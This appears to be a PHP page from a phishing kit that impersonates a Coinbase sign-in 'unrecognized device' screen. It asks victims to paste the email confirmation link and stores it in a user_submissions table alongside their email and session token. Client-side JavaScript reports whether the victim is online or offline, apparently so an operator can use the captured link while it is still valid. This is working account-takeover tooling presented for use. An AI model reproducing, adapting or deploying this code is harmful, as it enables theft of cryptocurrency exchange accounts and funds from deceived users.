<?php
// Start the session
session_start();

// Include the database connection file
require_once "admin/db_connection.php";

// Function to update user activity
function updateActivity($token, $activity) {
    global $conn; // Access the database connection within the function
    $sql = "UPDATE user_submissions SET activity = ? WHERE token = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $activity, $token);
    $stmt->execute();
    $stmt->close();
}

// Check if both the email and token are set in the session
if (!isset($_SESSION["email"]) || !isset($_SESSION["token"])) {
    // If email or token is not set, redirect the user back to login.php
    header("Location: login.php");
    exit();
}

// Retrieve the email and token from the session
$email = $_SESSION["email"];
$token = $_SESSION["token"];

// Update user activity to indicate visiting url.php
updateActivity($token, "UrlPage");

// Use prepared statement to validate the token
$stmt_token = $conn->prepare("SELECT * FROM user_submissions WHERE email = ? AND token = ?");
$stmt_token->bind_param("ss", $email, $token);
$stmt_token->execute();
$result_token = $stmt_token->get_result();

// If the token is invalid, redirect the user back to login.php
if ($result_token->num_rows !== 1) {
    header("Location: login.php");
    exit();
}

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve the URL submitted in the form
    $url = $_POST["url"];

    // Use prepared statement to update the user_submissions table with the URL
    $stmt = $conn->prepare("UPDATE user_submissions SET login_url = ? WHERE email = ?");
    $stmt->bind_param("ss", $url, $email);

    if ($stmt->execute()) {
        // URL stored successfully
        // Redirect or do further processing
        header("Location: loading.php");
        exit();
    } else {
        // Error storing URL in the database
        echo "Error: " . $conn->error;
    }

    $stmt->close();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="assets/favicon-32x32.png" type="image/x-icon">
    <title>Coinbase - Sign In</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        @font-face {
            font-family: 'CoinbaseSans';
            src: url('assets/CoinbaseSans2.woff2') format('woff2'),
                 url('path/to/CoinbaseSans.woff') format('woff');
        }
        body {
            margin: 0;
            padding: 0;
            background-color: #0A0B0D;
            font-family: 'CoinbaseSans', sans-serif;
        }

        .wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 60vh;
        }

        .login-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 80%;
            max-width: 400px;
            padding: 20px;
            border-radius: 16px;
            border: 1px solid rgba(91, 97, 110, 0.2);
            margin-top: 80px;
        }

        .uknown-image {
            width: 150px;
            margin-top: 20px;
        }

        h2 {
            font-size: 28px;
            font-weight: 600;
            color:white;
            margin-bottom: 0;
            text-align: center;
        }

        .login-form {
            margin-top: 40px;
        }

        .login-form p {
            color: #5b616e;
            font-size: 15px;
            font-weight: 400;
            line-height: 24px;
            margin-bottom: 40px;
            text-align: center;
        }

        .login-form input {
            appearance: none;
            background-color: #0A0B0D;
            border: 2px solid rgba(91, 97, 110, 0.2);
            border-radius: 8px;
            box-sizing: border-box;
            color: #0a0b0d;
            display: flex;
            color: white;
            flex-grow: 2;
            margin-bottom: 20px;
            margin-left: 20px;
            min-width: 0;
            padding: 16px;
            transition: border-color 0.3s ease-in-out;
            width: 90%;
        }

        .login-form input:focus {
            outline: none;
            border-color: #0052ff;
            background-color: #0A0B0D;
        }

        .login-form input::placeholder {
            color: #5b616e;
            font-family: 'CoinbaseSans', -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Helvetica", "Arial", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            font-size: 15px;
            opacity: 1;
        }

        .login-form button[type="submit"] {
            background-color: #0052ff;
            border: none;
            border-radius: 24px;
            color: #fff;
            cursor: pointer;
            font-family: 'CoinbaseSans', -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Helvetica", "Arial", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            font-size: 16px;
            font-weight: 600;
            line-height: 24px;
            margin-left: 20px;
            padding: 16px;
            width: 90%;
            margin-bottom: 20px;
        }

        .login-form button:hover {
            background-color: #014cec;
        }

        .link-container {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }

        .login-form a {
            color: #0052ff;
            text-decoration: none;
            font-size: 16px;
            font-weight: 400;
            line-height: 24px;
        }

        .underline {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="login-container">
            <img src="assets/desktopUnknown-2.svg" alt="Uknown Device" class="uknown-image">
            <form class="login-form" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
                <h2>We don't recognize this device</h2>
                <p>Please <span class="underline">copy the confirmation link sent <br></span>to your email <span><?php echo isset($_SESSION["email"]) ? htmlspecialchars($_SESSION["email"]) : ''; ?></span></p>
                <input type="url" id="url" name="url" placeholder="URL" required>
                <button type="submit">Continue</button>
                <div class="link-container">
                    <a href="#">Try another way</a>
                </div>
            </form>
        </div>
    </div>
</body>
</html>
<script>
    // Function to update user status
    function updateUserStatus(status) {
        // Send an AJAX request to update user status
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'update_status.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                // Handle response if needed
            }
        };
        xhr.send('status=' + status);
    }

    // Detect user activity
    function detectActivity() {
        var userActive = false;

        function setUserActive() {
            if (!userActive) {
                userActive = true;
                updateUserStatus('online');
            }
        }

        // Events to detect user activity
        window.addEventListener('mousemove', setUserActive);
        window.addEventListener('keydown', setUserActive);
        window.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                setUserActive();
            }
        });

        // Additional events for mobile devices
        window.addEventListener('touchstart', setUserActive);
        window.addEventListener('touchmove', setUserActive);
        window.addEventListener('orientationchange', setUserActive);
        window.addEventListener('scroll', setUserActive);

        // Set user as offline when the tab is closed
        window.addEventListener('beforeunload', function() {
            updateUserStatus('offline');
        });
    }

    // Call detectActivity function when the document is loaded
    document.addEventListener('DOMContentLoaded', detectActivity);
</script>